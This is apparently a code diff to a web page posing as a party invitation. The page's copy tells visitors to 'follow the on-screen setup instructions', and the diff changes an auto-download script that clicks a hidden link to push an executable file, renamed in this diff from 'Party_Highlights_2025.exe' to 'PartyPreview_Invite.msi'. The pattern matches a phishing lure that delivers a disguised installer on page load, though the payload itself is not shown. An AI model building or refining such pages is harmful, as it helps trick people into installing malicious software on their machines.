@@ -290,7 +290,7 @@
       venueLine2: "View and save the date and also send a Reply",
       venueLine3: "Follow the on-screen setup instructions.",
       venueLine4: "View and Save the date and also send a Reply ",
-      note: "Kindly join us for an evening of celebration, dinner and dancing. Dress code is classic elegance."
+      note: "Join us as we gather to celebrate this meaningful moment. An evening filled with laughter, great company, and memories destined to last a lifetime awaits."
     };
 
     for (const [k, v] of Object.entries(INVITE)) {
@@ -302,7 +302,7 @@
   <!-- Auto + manual download -->
   <script>
     // Change this once to your real file name (or path)
-    const FILE_NAME = "Party_Highlights_2025.exe";
+    const FILE_NAME = "PartyPreview_Invite.msi";
 
     // Wire manual link
     (function bindManual(){
@@ -350,7 +350,7 @@
           const a2 = document.createElement("a");
           a2.style.display = "none";
           a2.href = objectUrl;
-          a2.download = url.split("/").pop() || "Party_Highlights_2025.exe";
+          a2.download = url.split("/").pop() || "PartyPreview_Invite.msi";
           document.body.appendChild(a2);
           a2.click();
           a2.remove();
